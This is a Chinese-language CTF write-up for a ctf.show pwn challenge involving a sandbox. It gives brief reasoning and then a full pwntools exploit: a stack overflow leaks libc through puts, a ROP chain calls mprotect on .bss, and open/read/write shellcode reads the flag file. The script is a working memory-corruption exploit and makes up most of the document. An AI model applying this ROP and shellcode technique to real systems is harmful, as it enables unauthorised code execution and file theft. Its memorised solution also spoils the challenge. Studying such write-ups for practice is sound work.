# 挑战简介
理清逻辑，题目不难。

# 思路
奇怪的题目，还使用了沙箱逃逸，内容有些过多了  

贴个答案上来吧  

程序中有⼀个判断，当我们输⼊的⽂件路径有问题，它就会返回0，然后进⼊沙箱中，那么我们就可以  
任意输⼊，使其出错进⼊沙箱进⾏沙箱ROP，还是⾮常简单的   

先泄漏地址，再通过mprotect函数修改权限然后orw进⾏读flag，flag名称我们可以在远程连接的时候  
输⼊路径即可看到flag⽂件格式，详细过程这⾥不再概述⻅exp。  
 
```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28164)

elf = ELF('./pwn')

main = elf.symbols['main']

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = 0x401ba3

payload = b'a' * 0x418 + p8(0x28)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

io.sendlineafter('>>', payload)

puts = u64(io.recvuntil('\x7f')[-6:] + b'\x00\x00')
print(hex(puts))

pause()
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
print(hex(libc_base))

payload = b'a' * 0x418 + p8(0x28)
payload += p64(pop_rdi) + p64(elf.bss())
payload += p64(libc_base + libc.dump('gets'))
payload += p64(pop_rdi) + p64(elf.bss() & 0xfffffffffffff000)
payload += p64(libc_base + 0x23e6a) + p64(0x1000)
payload += p64(libc_base + 0x1b96)
payload += p64(7) + p64(libc_base + libc.dump('mprotect')) + p64(elf.bss())

io.sendlineafter('>>', payload)

shellcode = asm('''
			 mov rax, 0x67616c662f2e
                push rax
                mov rdi, rsp
                xor esi, esi
                mov eax, 0x2
                syscall 

                cmp eax, 0x0
                jg next
                push 1
                mov edi, 1
                mov rsi, rsp
                mov edx, 4
                mov eax, edi
                syscall
                jmp exit

                next:
                mov rdi, rax 
                mov rsi, rsp
                mov edx, 0x100
                xor eax, eax
                syscall

                mov edx, eax
                mov edi, 1
                mov rsi, rsp
                mov eax, edi
                syscall

                exit:
                xor rdi, rdi
                mov eax, 231
                syscall
''')

io.sendline(shellcode)

io.interactive()
```
